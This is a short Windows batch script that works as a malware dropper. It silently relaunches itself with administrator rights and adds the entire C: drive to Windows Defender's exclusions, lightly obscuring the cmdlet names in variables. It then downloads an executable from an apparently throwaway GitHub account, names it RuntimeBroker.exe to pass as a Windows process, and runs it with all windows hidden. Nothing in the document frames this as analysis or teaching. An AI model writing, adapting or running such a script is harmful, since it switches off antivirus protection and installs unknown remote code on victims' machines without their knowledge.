@echo off
:: Check if running as admin, if not, restart as admin with hidden PowerShell
net session >nul 2>&1 || (
    powershell -WindowStyle Hidden -c "Start-Process '%~0' -Verb RunAs"
    exit /b
)

:: Windows Defender exclusion for C: drive
set "A=Add-MpPreference"
set "B=ExclusionPath"
set "C=C:\"
powershell -WindowStyle Hidden -Command "%A% -%B% '%C%'"

:: Download file from the URL
set "URL=https://raw.githubusercontent.com/jjjjjjjjjjjqqqqqqjjjj/jjjjjjjjjj/main/RuntimeBroker.exe"
set "OUTFILE=C:\Windows\Temp\RuntimeBroker.exe"
powershell -WindowStyle Hidden -Command "Start-BitsTransfer -Source '%URL%' -Destination '%OUTFILE%'"

:: Run the downloaded file
set "I=Start-Process"
set "J=C:\Windows\Temp\RuntimeBroker.exe"
powershell -WindowStyle Hidden -Command "%I% '%J%'"

:: Exit with no window
exit
